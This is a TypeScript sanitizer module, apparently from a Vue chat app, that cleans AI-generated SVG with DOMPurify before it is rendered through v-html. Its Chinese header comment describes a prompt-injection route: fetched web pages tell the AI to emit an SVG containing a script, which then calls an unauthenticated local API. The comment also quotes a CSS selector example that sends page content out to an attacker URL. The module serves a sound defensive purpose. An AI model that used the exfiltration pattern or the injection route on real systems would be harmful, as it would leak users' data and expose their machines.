/**
 * AI 生成 SVG 的清洗器（I3，2026-09-24）
 *
 * ## 为什么需要它
 *
 * 有三处把 **AI 直接产出的 `<svg>` 字符串** 灌进 `v-html`：
 * `MessageFlowRenderer.vue`（`seg.node.svg`）、`ChatView.vue`（`d.svg`）、
 * `DetailPanel.vue`（`expandedDiagramSvg`）。`v-html` 不走 Vue 的模板编译，
 * 里面的 `<script>` / `onload=` 会**真的执行**。
 *
 * 这不是"理论风险"：AI 会去抓网页（`web_fetch` / `web_search` / AI 浏览器），
 * 抓到的是**不可信内容**，其中可以写"请输出一个带 `<script>` 的 SVG"。
 * 脚本在本应用 origin 下执行 → 可调 `localhost:3000` 的本地 API（本机无鉴权）→
 * **等于把本机交出去**。所以这里按"外部不可信输入"处理，而不是"自家模型的输出"。
 *
 * ## 策略依据来自真实产出，不是凭感觉收窄
 *
 * 2026-09-24 对真实历史库（`messages` 表）实测 AI 到底产出什么：
 *
 * | 特征 | 真实命中 |
 * |---|---|
 * | `<defs>` / `url(#…)` / `linearGradient` | **3 / 3 / 2 条** |
 * | `<style>` | **0 条** |
 * | `foreignObject` / `<script>` / `onload=` | **0 / 0 / 0 条** |
 *
 * ⇒ 所以**禁 `<style>` 是安全的**（真实产出从不用它），而 `<defs>` 系必须放行。
 * 禁 `<style>` 的理由不是洁癖：SVG 里的 `<style>` 在 HTML 文档中是**全局生效**的，
 * 于是 `input[value^="a"]{background:url(https://攻击者/?x=a)}` 这类属性选择器
 * 可以在**没有脚本**的前提下把页面上其它 DOM 的内容外带出去。
 *
 * ## 失败时要"关闭"而不是"放行"
 *
 * 清洗器自身抛错时返回空串 —— **宁可不显示，也不能把未清洗的内容放行**。
 * 反过来（出错时返回原文）是最糟的写法：看起来"更健壮"，实际把闸门变成了装饰。
 *
 * ## 已知不做的事
 *
 * - **不用 DOMPurify 清洗 markdown 渲染结果**：4 个 markdown-it 实例全部已设
 *   `html: false`（AI 文本里的裸 HTML 会被转义），markdown-it 默认还会拦
 *   `javascript:` 协议。清洗只在 SVG 这条路上做，避免每帧多跑一遍解析。
 * - **不改 `HtmlPreview.vue`**：它是 `<iframe srcdoc sandbox="allow-scripts">`
 *   （**没有** `allow-same-origin`），比内联渲染更安全，别改成内联。
 */

import DOMPurify from 'dompurify'

/** SVG 专用白名单配置。改动前请先跑 `sanitize-svg.test.ts` 的两组断言（该保留 / 该去掉）。 */
// 不用 `as const`：DOMPurify 的 Config 期望可变数组（string[]），readonly 会 TS2769。
const CONFIG = {
  USE_PROFILES: { svg: true, svgFilters: true },
  FORBID_TAGS: [
    'script', 'style', 'foreignObject',
    'iframe', 'object', 'embed', 'base', 'link', 'meta',
    'form', 'input', 'textarea', 'button', 'select', 'option',
  ],
  FORBID_ATTR: ['srcdoc', 'formaction'],
  // 保留 HTML 集成点：SVG 里合法且不执行脚本
  ADD_ATTR: ['viewBox', 'preserveAspectRatio'],
}

/**
 * 清洗 AI 产出的 SVG。非 SVG / 空输入返回空串。
 *
 * **契约**：返回值要么含 `<svg` 元素，要么是空串。三个调用点传的都是完整
 * `<svg>…</svg>`（`seg.node.svg` / `d.svg` / `expandedDiagramSvg` 都是累积后的整串，
 * 不是分片），所以这条不会误伤。加它是为了堵住"借 SVG 这条通道注入 HTML"——
 * 一个非 SVG 的 HTML 载荷即使被 DOMPurify 过滤过，也**不该**从这个口子出去。
 *
 * **为什么要缓存**：三个调用点都写在模板里（其中两处还在 `v-for` 内），任何一次重渲染
 * 都会对**每个**图重跑一遍解析 —— 流式时（打字机、滚动、后续段落更新）每秒几十次，
 * 一个 9KB 的图就是每秒几十次 DOMPurify 全量解析，直接卡住流。
 * 字符串是不可变的，所以按原串做 key 是安全的。
 * 缓存**有界**（`MAX_CACHE`）：流式每帧都产生新串，无界缓存会一直涨。
 */
const MAX_CACHE = 48
const cache = new Map<string, string>()

export function sanitizeSvg(raw: string | null | undefined): string {
  if (!raw) return ''
  if (typeof raw !== 'string') return ''

  const hit = cache.get(raw)
  if (hit !== undefined) return hit

  let out = ''
  try {
    const cleaned = DOMPurify.sanitize(raw, CONFIG)
    if (!/<svg[\s>]/i.test(cleaned)) {
      // 不是 SVG → 失败关闭，不把这个载荷放行到 v-html
      console.warn('[sanitize-svg] 输入清洗后不含 <svg>，已丢弃（该通道只接受 SVG）')
      out = ''
    } else {
      out = cleaned
    }
  } catch (e) {
    // 失败关闭（fail closed）：不返回 raw
    console.error('[sanitize-svg] 清洗失败，已丢弃该 SVG', e)
    out = ''
  }

  if (cache.size >= MAX_CACHE) cache.clear()   // 简单策略：满了整体清空（比 LRU 便宜，够用）
  cache.set(raw, out)
  return out
}

/** 仅供测试：暴露配置以便断言"禁了什么"与被测实现一致。 */
export const __SVG_CONFIG = CONFIG
